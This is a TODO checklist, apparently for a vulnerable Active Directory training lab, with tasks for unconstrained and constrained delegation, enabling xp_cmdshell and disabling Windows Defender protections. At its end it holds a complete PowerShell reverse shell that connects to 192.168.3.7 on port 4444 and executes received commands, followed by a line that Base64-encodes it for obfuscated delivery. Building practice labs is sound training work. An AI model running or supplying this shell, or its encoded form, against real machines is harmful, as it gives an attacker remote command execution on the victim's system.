# TODO

# General
- [ ] Static IPs
- [ ] Create a confi.json with all the repited data like domain admin credentials
- [X] Install Vuln-AD-plus -> The problem was on the script :D
  - [ ] Make it into yml files
- [X] Disable Real Time monitoring in all the machines
  - [X] Disable cloud-delivered protection
  - [X} Disable sample submission

# Raditz - Unconstrained Delegation
- [X] Unconstrained delegation (HTTP-> RADITZ)
  - [X]  Add scheduled tasks to perform a web request from gohan  to raditz -> It doesnt matter if you use SpoolSample 
    - [X] Mount a web site with domain authentication [web](https://blog.xpnsec.com/kerberos-attacks-part-1/)
    - [ ] Resolve odd behaviour: When a user authenticates againts the machinethe user's ticket doesn't appear on the unconstrained machine
    - [ ] Probar a eliminar el win_feature "web-server" del main de raditz.

# Gohan - Constrained Delegation
- [ ] Constrained delegation (MSSL -> DC)
  - [X] Install datase server
  - [ ] Enable xp_cmdshell
  - [ ] Allow domain user to access the database
  - [ ] Add contrained delegation

# Workstation - Vulnerable service

- [X] Create W10 WST
  - [X] Install vulnerable a service
- [ ] Install virtual studio code
- [ ] Install hacking tools


$str = '$client = New-Object System.Net.Sockets.TCPClient("192.168.3.7",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($str))